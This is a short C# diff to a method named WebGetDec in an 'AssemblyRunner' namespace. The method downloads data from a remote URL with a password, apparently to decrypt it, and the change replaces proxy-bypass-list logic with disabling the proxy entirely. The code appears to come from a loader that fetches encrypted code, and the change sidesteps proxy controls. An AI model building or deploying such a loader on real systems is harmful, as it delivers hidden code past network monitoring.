@@ -56,12 +56,7 @@ namespace AssemblyRunner
         public static byte[] WebGetDec(string fnewfile, string password)
         {
             WebClient client = new WebClient();
-            WebProxy proxy = new WebProxy();
-            string[] byp = fnewfile.Split('/');
-            string bypip = byp[2];
-            List<string> bypasslist = new List<string>(proxy.BypassList);
-            bypasslist.Add(bypip);
-            proxy.BypassList = bypasslist.ToArray();
+            client.Proxy = null;            
             using (MemoryStream stream = new MemoryStream(client.DownloadData(fnewfile)))
             {
                 var newstr = Encoding.ASCII.GetString(stream.ToArray());
